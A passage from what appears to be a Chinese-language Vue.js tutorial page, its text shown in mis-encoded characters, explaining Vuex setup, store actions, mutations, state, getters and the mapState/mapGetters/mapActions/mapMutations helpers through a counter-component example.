class="hljs-string">&#x27;è¶…çº§ç›ä¸½&#x27;</span>]</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h1 id="3-VUEX"><a href="#3-VUEX" class="headerlink" title="3. VUEX"></a>3. VUEX</h1><p>åŸç†å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155349526.png" alt="image-20221124155349526"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155424516.png"></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155500975.png" alt="image-20221124155500975"></p><h2 id="3-1-æ¦‚å¿µ"><a href="#3-1-æ¦‚å¿µ" class="headerlink" title="3.1 æ¦‚å¿µ"></a>3.1 æ¦‚å¿µ</h2><p>åœ¨Vueä¸­å®ç°é›†ä¸­å¼çŠ¶æ€ï¼ˆæ•°æ®ï¼‰ç®¡ç†çš„ä¸€ä¸ªVueæ’ä»¶ï¼Œå¯¹vueåº”ç”¨ä¸­å¤šä¸ªç»„ä»¶çš„å…±äº«çŠ¶æ€è¿›è¡Œé›†ä¸­å¼çš„ç®¡ç†ï¼ˆè¯»&#x2F;å†™ï¼‰ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œä¸”é€‚ç”¨äºä»»æ„ç»„ä»¶é—´é€šä¿¡ã€‚</p><p><a href="https://github.com/vuejs/vuex">Vuex Githubåœ°å€</a></p><h2 id="3-2-ä½•æ—¶ä½¿ç”¨ï¼Ÿ"><a href="#3-2-ä½•æ—¶ä½¿ç”¨ï¼Ÿ" class="headerlink" title="3.2 ä½•æ—¶ä½¿ç”¨ï¼Ÿ"></a>3.2 ä½•æ—¶ä½¿ç”¨ï¼Ÿ</h2><ol><li><p>å¤šä¸ªç»„ä»¶éœ€è¦å…±äº«æ•°æ®æ—¶</p></li><li><p>å¤šä¸ªç»„ä»¶ä¾èµ–äºåŒä¸€çŠ¶æ€</p></li><li><p>æ¥è‡ªä¸åŒç»„ä»¶çš„è¡Œä¸ºéœ€è¦å˜æ›´åŒä¸€çŠ¶æ€</p></li></ol><h2 id="3-3-æ­å»ºvuexç¯å¢ƒ"><a href="#3-3-æ­å»ºvuexç¯å¢ƒ" class="headerlink" title="3.3 æ­å»ºvuexç¯å¢ƒ"></a>3.3 æ­å»ºvuexç¯å¢ƒ</h2><ol><li><p>ä¸‹è½½å®‰è£…vuex <code>npm i vuex</code></p><p>Vueå¯¹é»˜è®¤ç‰ˆæœ¬è¿›è¡Œäº†æ›´æ–°ï¼Œç°åœ¨é»˜è®¤ä½¿ç”¨Vue3 ã€‚npm i vuex é»˜è®¤ä¸‹è½½vuex4ï¼ŒVue2æ— æ³•ä½¿ç”¨ï¼Œè‡ªèƒ½ä½¿ç”¨vuex3ã€‚ä½¿ç”¨Vue2ä½¿ç”¨ <code>npm i vuex@3</code> ä¸‹è½½</p></li><li><p>åˆ›å»º<code>src/store/index.js</code>è¯¥æ–‡ä»¶ç”¨äºåˆ›å»ºVuexä¸­æœ€ä¸ºæ ¸å¿ƒçš„<strong>store</strong></p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//å¼•å…¥Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//åº”ç”¨Vuexæ’ä»¶</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//å‡†å¤‡actionså¯¹è±¡â€”â€”å“åº”ç»„ä»¶ä¸­ç”¨æˆ·çš„åŠ¨ä½œ</span><br><span class="hljs-keyword">const</span> actions = &#123;&#125;<br><span class="hljs-comment">//å‡†å¤‡mutationså¯¹è±¡â€”â€”ä¿®æ”¹stateä¸­çš„æ•°æ®</span><br><span class="hljs-keyword">const</span> mutations = &#123;&#125;<br><span class="hljs-comment">//å‡†å¤‡stateå¯¹è±¡â€”â€”ä¿å­˜å…·ä½“çš„æ•°æ®</span><br><span class="hljs-keyword">const</span> state = &#123;&#125;<br><br><span class="hljs-comment">//åˆ›å»ºå¹¶æš´éœ²store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state<br>&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li>åœ¨<code>main.js</code>ä¸­åˆ›å»ºvmæ—¶ä¼ å…¥<code>store</code>é…ç½®é¡¹</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span><span class="hljs-comment">// å¼•å…¥store</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br><span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>store,<span class="hljs-comment">// é…ç½®é¡¹æ·»åŠ store</span><br><span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$bus</span> = <span class="hljs-variable language_">this</span><br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="3-4-åŸºæœ¬ä½¿ç”¨"><a href="#3-4-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="3.4 åŸºæœ¬ä½¿ç”¨"></a>3.4 åŸºæœ¬ä½¿ç”¨</h2><ol><li>åˆå§‹åŒ–æ•°æ®ã€é…ç½®<code>actions</code>ã€é…ç½®<code>mutations</code>ï¼Œæ“ä½œæ–‡ä»¶<code>store.js</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//å¼•å…¥Vueæ ¸å¿ƒåº“</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//å¼•å…¥Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//å¼•ç”¨Vuex</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-keyword">const</span> actions = &#123;<br>    <span class="hljs-comment">//å“åº”ç»„ä»¶ä¸­åŠ çš„åŠ¨ä½œ</span><br><span class="hljs-title function_">jia</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-comment">// console.log(&#x27;actionsä¸­çš„jiaè¢«è°ƒç”¨äº†&#x27;,miniStore,value)</span><br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;,<br>&#125;<br><br><span class="hljs-keyword">const</span> mutations = &#123;<br>    <span class="hljs-comment">//æ‰§è¡ŒåŠ </span><br><span class="hljs-title function_">JIA</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-comment">// console.log(&#x27;mutationsä¸­çš„JIAè¢«è°ƒç”¨äº†&#x27;,state,value)</span><br>state.<span class="hljs-property">sum</span> += value<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//åˆå§‹åŒ–æ•°æ®</span><br><span class="hljs-keyword">const</span> state = &#123;<br>   <span class="hljs-attr">sum</span>:<span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">//åˆ›å»ºå¹¶æš´éœ²store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state,<br>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">2. ç»„ä»¶ä¸­è¯»å–vuexä¸­çš„æ•°æ®ï¼š`$store.state.sum`3. ç»„ä»¶ä¸­ä¿®æ”¹vuexä¸­çš„æ•°æ®ï¼š`$store.dispatch(&#39;actionä¸­çš„æ–¹æ³•å&#39;,æ•°æ®)`æˆ– `$store.commit(&#39;mutationsä¸­çš„æ–¹æ³•å&#39;,æ•°æ®)`</code></pre><blockquote><p>å¤‡æ³¨ï¼šè‹¥æ²¡æœ‰ç½‘ç»œè¯·æ±‚æˆ–å…¶ä»–ä¸šåŠ¡é€»è¾‘ï¼Œç»„ä»¶ä¸­ä¹Ÿå¯ä»¥è¶Šè¿‡actionsï¼Œå³ä¸å†™<code>dispatch</code>ï¼Œç›´æ¥ç¼–å†™<code>commit</code></p></blockquote><p>å…·ä½“æ¡ˆä¾‹ï¼š</p><p>src&#x2F;store&#x2F;index.jsè¯¥æ–‡ä»¶ç”¨äºåˆ›å»ºVuexä¸­æœ€ä¸ºæ ¸å¿ƒçš„store</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//è¯¥æ–‡ä»¶ç”¨äºåˆ›å»ºVuexä¸­æœ€ä¸ºæ ¸å¿ƒçš„store</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//å¼•å…¥Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//åº”ç”¨Vuexæ’ä»¶</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//å‡†å¤‡actionsâ€”â€”ç”¨äºå“åº”ç»„ä»¶ä¸­çš„åŠ¨ä½œ</span><br><span class="hljs-keyword">const</span> actions = &#123;<br><span class="hljs-comment">/* jia(context,value)&#123;</span><br><span class="hljs-comment">console.log(&#x27;actionsä¸­çš„jiaè¢«è°ƒç”¨äº†&#x27;)</span><br><span class="hljs-comment">context.commit(&#x27;JIA&#x27;,value)</span><br><span class="hljs-comment">&#125;,</span><br><span class="hljs-comment">jian(context,value)&#123;</span><br><span class="hljs-comment">console.log(&#x27;actionsä¸­çš„jianè¢«è°ƒç”¨äº†&#x27;)</span><br><span class="hljs-comment">context.commit(&#x27;JIAN&#x27;,value)</span><br><span class="hljs-comment">&#125;, */</span><br><span class="hljs-title function_">jiaOdd</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;actionsä¸­çš„jiaOddè¢«è°ƒç”¨äº†&#x27;</span>)<br><span class="hljs-keyword">if</span>(context.<span class="hljs-property">state</span>.<span class="hljs-property">sum</span> % <span class="hljs-number">2</span>)&#123;<br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;<br>&#125;,<br><span class="hljs-title function_">jiaWait</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;actionsä¸­çš„jiaWaitè¢«è°ƒç”¨äº†&#x27;</span>)<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;,<span class="hljs-number">500</span>)<br>&#125;<br>&#125;<br><span class="hljs-comment">//å‡†å¤‡mutationsâ€”â€”ç”¨äºæ“ä½œæ•°æ®ï¼ˆstateï¼‰</span><br><span class="hljs-keyword">const</span> mutations = &#123;<br><span class="hljs-title function_">JIA</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutationsä¸­çš„JIAè¢«è°ƒç”¨äº†&#x27;</span>)<br>state.<span class="hljs-property">sum</span> += value<br>&#125;,<br><span class="hljs-title function_">JIAN</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutationsä¸­çš„JIANè¢«è°ƒç”¨äº†&#x27;</span>)<br>state.<span class="hljs-property">sum</span> -= value<br>&#125;<br>&#125;<br><span class="hljs-comment">//å‡†å¤‡stateâ€”â€”ç”¨äºå­˜å‚¨æ•°æ®</span><br><span class="hljs-keyword">const</span> state = &#123;<br><span class="hljs-attr">sum</span>:<span class="hljs-number">0</span> <span class="hljs-comment">//å½“å‰çš„å’Œ</span><br>&#125;<br><br><span class="hljs-comment">//åˆ›å»ºå¹¶æš´éœ²store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state,<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;Count.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;å½“å‰æ±‚å’Œä¸ºï¼š&#123;&#123; $store.state.sum &#125;&#125;&lt;/h1&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;incrementOdd&quot;&gt;å½“å‰æ±‚å’Œä¸ºå¥‡æ•°å†åŠ &lt;/button&gt;<br>&lt;button @click=&quot;incrementWait&quot;&gt;ç­‰ä¸€ç­‰å†åŠ &lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>name:&#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n:1, //ç”¨æˆ·é€‰æ‹©çš„æ•°å­—<br>&#125;<br>&#125;,<br>methods: &#123;<br>increment()&#123;<br>this.$store.commit(&#x27;JIA&#x27;,this.n)<br>&#125;,<br>decrement()&#123;<br>this.$store.commit(&#x27;JIAN&#x27;,this.n)<br>&#125;,<br>incrementOdd()&#123;<br>this.$store.dispatch(&#x27;jiaOdd&#x27;,this.n)<br>&#125;,<br>incrementWait()&#123;<br>this.$store.dispatch(&#x27;jiaWait&#x27;,this.n)<br>&#125;,<br>&#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style lang=&quot;css&quot;&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;<br></code></pre></td></tr></table></figure><h2 id="3-5-gettersçš„ä½¿ç”¨"><a href="#3-5-gettersçš„ä½¿ç”¨" class="headerlink" title="3.5 gettersçš„ä½¿ç”¨"></a>3.5 gettersçš„ä½¿ç”¨</h2><ol><li><p>æ¦‚å¿µï¼šå½“stateä¸­çš„æ•°æ®éœ€è¦ç»è¿‡åŠ å·¥åå†ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨gettersåŠ å·¥ï¼Œç›¸å½“äºå…¨å±€è®¡ç®—å±æ€§ã€‚</p></li><li><p>åœ¨<code>store.js</code>ä¸­è¿½åŠ <code>getters</code>é…ç½®</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">......<br><br><span class="hljs-keyword">const</span> getters = &#123;<br><span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>)&#123;<br><span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// åˆ›å»ºå¹¶æš´éœ²store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>......<br>getters<br>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">3. ç»„ä»¶ä¸­è¯»å–æ•°æ®ï¼š`$store.getters.bigSum`</code></pre><h2 id="3-6-å››ä¸ªmapæ–¹æ³•çš„ä½¿ç”¨"><a href="#3-6-å››ä¸ªmapæ–¹æ³•çš„ä½¿ç”¨" class="headerlink" title="3.6 å››ä¸ªmapæ–¹æ³•çš„ä½¿ç”¨"></a>3.6 å››ä¸ªmapæ–¹æ³•çš„ä½¿ç”¨</h2><p>å¯¼å…¥  <code>import &#123;mapState, mapGetters, mapActions, mapMutations&#125; from &#39;vuex&#39;</code></p><ol><li><p><strong>mapStateæ–¹æ³• ï¼š</strong>ç”¨äºå¸®åŠ©æˆ‘ä»¬æ˜ å°„<code>state</code>ä¸­çš„æ•°æ®ä¸ºè®¡ç®—å±æ€§</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">computed</span>: &#123;<br>  <span class="hljs-comment">// å€ŸåŠ©mapStateç”Ÿæˆè®¡ç®—å±æ€§ï¼šsumã€schoolã€subjectï¼ˆå¯¹è±¡å†™æ³•ä¸€ï¼‰</span><br>  ...<span class="hljs-title function_">mapState</span>(&#123;<span class="hljs-attr">sum</span>:<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-attr">school</span>:<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-attr">subject</span>:<span class="hljs-string">&#x27;subject&#x27;</span>&#125;),<br><br>  <span class="hljs-comment">// å€ŸåŠ©mapStateç”Ÿæˆè®¡ç®—å±æ€§ï¼šsumã€schoolã€subjectï¼ˆæ•°ç»„å†™æ³•äºŒï¼‰</span><br>  ...<span class="hljs-title function_">mapState</span>([<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-string">&#x27;subject&#x27;</span>]),<br>&#125;,<br></code></pre></td></tr></table></figure></li><li><p><strong>mapGettersæ–¹æ³• ï¼š</strong>ç”¨äºå¸®åŠ©æˆ‘ä»¬æ˜ å°„<code>getters</code>ä¸­çš„æ•°æ®ä¸ºè®¡ç®—å±æ€§</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">computed</span>: &#123;<br>    <span class="hljs-comment">//å€ŸåŠ©mapGettersç”Ÿæˆè®¡ç®—å±æ€§ï¼šbigSumï¼ˆå¯¹è±¡å†™æ³•ä¸€ï¼‰</span><br>    ...<span class="hljs-title function_">mapGetters</span>(&#123;<span class="hljs-attr">bigSum</span>:<span class="hljs-string">&#x27;bigSum&#x27;</span>&#125;),<br><br>    <span class="hljs-comment">//å€ŸåŠ©mapGettersç”Ÿæˆè®¡ç®—å±æ€§ï¼šbigSumï¼ˆæ•°ç»„å†™æ³•äºŒï¼‰</span><br>    ...<span class="hljs-title function_">mapGetters</span>([<span class="hljs-string">&#x27;bigSum&#x27;</span>])<br>&#125;,<br></code></pre></td></tr></table></figure></li><li><p><strong>mapActionsæ–¹æ³• ï¼š</strong>ç”¨äºå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆä¸<code>actions</code>å¯¹è¯çš„æ–¹æ³•ï¼Œå³ï¼šåŒ…å«<code>$store.dispatch(xxx)</code>çš„å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">methods</span>:&#123;<br>    <span class="hljs-comment">//é mapActionsç”Ÿæˆï¼šincrementOddã€incrementWaitï¼ˆå¯¹è±¡å½¢å¼ï¼‰</span><br>    ...<span class="hljs-title function_">mapActions</span>(&#123;<span class="hljs-attr">incrementOdd</span>:<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-attr">incrementWait</span>:<span class="hljs-string">&#x27;jiaWait&#x27;</span>&#125;)<br><br>    <span class="hljs-comment">//é mapActionsç”Ÿæˆï¼šincrementOddã€incrementWaitï¼ˆæ•°ç»„å½¢å¼ï¼‰</span><br>    ...<span class="hljs-title function_">mapActions</span>([<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-string">&#x27;jiaWait&#x27;</span>])<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>mapMutationsæ–¹æ³• ï¼š</strong>ç”¨äºå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆä¸<code>mutations</code>å¯¹è¯çš„æ–¹æ³•ï¼Œå³ï¼šåŒ…å«<code>$store.commit(xxx)</code>çš„å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">methods</span>:&#123;<br>    <span class="hljs-comment">//é mapActionsç”Ÿæˆï¼šincrementã€decrementï¼ˆå¯¹è±¡å½¢å¼ï¼‰</span><br>    ...<span class="hljs-title function_">mapMutations</span>(&#123;<span class="hljs-attr">increment</span>:<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-attr">decrement</span>:<span class="hljs-string">&#x27;JIAN&#x27;</span>&#125;),<br>    <br>    <span class="hljs-comment">//é mapMutationsç”Ÿæˆï¼šJIAã€JIANï¼ˆå¯¹è±¡å½¢å¼ï¼‰</span><br>    ...<span class="hljs-title function_">mapMutations</span>([<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-string">&#x27;JIAN&#x27;</span>]),<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>å¤‡æ³¨ï¼šmapActionsä¸mapMutationsä½¿ç”¨æ—¶ï¼Œè‹¥éœ€è¦ä¼ é€’å‚æ•°éœ€è¦ï¼šåœ¨æ¨¡æ¿ä¸­ç»‘å®šäº‹ä»¶æ—¶ä¼ é€’å¥½å‚æ•°ï¼Œå¦åˆ™ä¼ çš„å‚æ•°æ˜¯äº‹ä»¶å¯¹è±¡(event)ã€‚</p></blockquote><p>å…·ä½“æ¡ˆä¾‹ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;å½“å‰æ±‚å’Œä¸ºï¼š&#123;&#123; sum &#125;&#125;&lt;/h1&gt;<br>&lt;h3&gt;å½“å‰æ±‚å’Œçš„10å€ä¸ºï¼š&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;<br>&lt;h3&gt;æˆ‘æ˜¯&#123;&#123; name &#125;&#125;ï¼Œæˆ‘åœ¨&#123;&#123; school &#125;&#125;å­¦ä¹ &lt;/h3&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option 